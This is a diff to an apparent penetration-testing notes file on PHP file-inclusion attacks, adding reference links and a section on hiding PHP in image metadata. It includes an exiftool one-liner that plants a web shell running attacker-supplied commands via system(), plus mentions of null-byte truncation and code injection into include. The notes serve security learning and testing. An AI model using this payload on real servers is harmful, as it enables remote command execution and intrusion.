@@ -10,6 +10,17 @@
 - Don't forget about the null byte! `%00`
 - https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
 - https://upshell.wordpress.com/2011/06/11/new-vulnerabilities-to-access-files-in-php/
+- https://websec.io/2012/09/05/A-Silent-Threat-PHP-in-EXIF.html
+
+### Inclusion with Images
+Sometimes you may have an `include` but you can add arbitrary PHP files. There may however be a place to add images and you can embed php in an image which gets executed if the image is included.
+
+```
+exiftool -documentname='<?php echo system(isset($_GET["c"]) ? $_GET["c"] : "ls -lah"); ?>' profile.jpg
+```
+
+
+
 
 Sometimes PHP is so terribly configured you can inject your code into the inclusion. 
 Here is an example of how you can pass a `sleep(10);` into a possible `include` which 
